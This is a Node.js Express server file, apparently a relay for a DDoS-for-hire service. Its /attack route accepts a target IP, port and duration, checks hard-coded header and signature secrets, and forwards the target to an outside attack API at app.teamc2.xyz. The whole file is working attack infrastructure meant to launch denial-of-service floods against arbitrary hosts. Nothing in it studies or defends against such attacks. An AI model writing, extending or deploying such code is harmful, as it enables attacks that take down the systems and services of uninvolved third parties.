// ================= 🔥 GLOBAL ERROR DEBUG =================
process.on("uncaughtException", err => {
  console.error("🔥 UNCAUGHT EXCEPTION:", err);
});

process.on("unhandledRejection", err => {
  console.error("🔥 UNHANDLED PROMISE:", err);
});

// ================= IMPORTS =================
const express = require("express");
const axios = require("axios");
const cors = require("cors");
const crypto = require("crypto");

const app = express();

app.use(cors());
app.use(express.json());

// ================= ENV =================
const API_KEY = process.env.API_KEY;

// ❗ IMPORTANT: NO fallback
const PORT = process.env.PORT;

console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
console.log("PORT FROM ENV:", PORT);

// ================= 🔐 SECURITY =================
const SECRET = "SECRET123";

function sha256(data) {
  return crypto.createHash("sha256").update(data).digest("hex");
}

// ================= ROUTES =================

// ⚡ ultra-fast health (Railway ke liye critical)
app.get("/", (req, res) => res.status(200).send("OK"));
app.get("/health", (req, res) => res.status(200).send("OK"));

// 🧪 debug route
app.get("/debug", (req, res) => {
  res.json({
    status: "running",
    port: PORT,
    hasApiKey: !!API_KEY,
    time: new Date().toISOString()
  });
});

// ================= MAIN ROUTE =================
app.post("/attack", async (req, res) => {
  try {
    console.log("➡️ Incoming /attack request");

    if (req.headers["x-sec"] !== "9xK3pL") {
      console.log("❌ Invalid x-sec");
      return res.status(403).json({ error: "Forbidden" });
    }

    let { ip, port, time } = req.body;

    console.log("📥 Body:", req.body);

    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    port = Number(port);
    time = Number(time);

    if (isNaN(port) || isNaN(time)) {
      return res.status(400).json({ error: "Invalid port/time" });
    }

    const expected = sha256(ip + port + time + SECRET);

    if (req.headers["x-sign"] !== expected) {
      console.log("❌ Invalid signature");
      return res.status(403).json({ error: "Invalid sign" });
    }

    if (!API_KEY) {
      console.log("❌ API key missing");
      return res.status(500).json({ error: "API key missing" });
    }

    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;

    console.log("🌐 Calling API:", url);

    const response = await axios.get(url, { timeout: 10000 });

    console.log("✅ API success");

    return res.json({
      success: true,
      data: response.data,
    });

  } catch (err) {
    console.error("🔥 ROUTE ERROR:", err?.response?.data || err.message);

    return res.status(500).json({
      error: err?.response?.data || "Server error",
    });
  }
});

// ================= START =================

// ❗ fail fast if no PORT
if (!PORT) {
  console.error("❌ PORT not provided by Railway!");
  process.exit(1);
}

const server = app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

// ================= KEEP ALIVE =================
setInterval(() => {
  console.log("💓 keep-alive ping", new Date().toISOString());
}, 30000);